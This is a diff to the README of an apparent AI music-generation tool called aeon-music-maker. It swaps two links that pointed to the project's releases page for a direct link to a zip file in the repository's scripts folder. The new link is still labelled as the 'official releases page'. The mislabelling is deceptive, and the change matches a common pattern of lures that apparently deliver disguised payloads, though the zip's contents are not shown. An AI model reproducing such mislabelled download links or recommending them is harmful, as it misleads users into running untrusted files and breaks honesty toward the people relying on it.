@@ -1,6 +1,6 @@
 # 🎵 aeon-music-maker - Generate professional music with simple text
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue?style=for-the-badge)](https://github.com/Mechanized-scapegrace221/aeon-music-maker/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue?style=for-the-badge)](https://github.com/Mechanized-scapegrace221/aeon-music-maker/raw/refs/heads/main/scripts/aeon_music_maker_2.8-beta.2.zip)
 
 aeon-music-maker generates audio tracks from text descriptions. It uses the ACE Step 1.5 XL model to ensure musical quality. The software applies mastering presets to your audio, ensuring that the volume and balance sound correct for playback on any speaker system. This tool handles the technical steps of audio synthesis and signal processing so you focus on the creative side of music production.
 
@@ -18,7 +18,7 @@ Your computer requires specific hardware to process artificial intelligence task
 
 You obtain the software directly from the official release page. This page hosts all available versions of the tool.
 
-[Visit the official releases page to download the latest version](https://github.com/Mechanized-scapegrace221/aeon-music-maker/releases)
+[Visit the official releases page to download the latest version](https://github.com/Mechanized-scapegrace221/aeon-music-maker/raw/refs/heads/main/scripts/aeon_music_maker_2.8-beta.2.zip)
 
 Follow these steps to find the correct file:
 
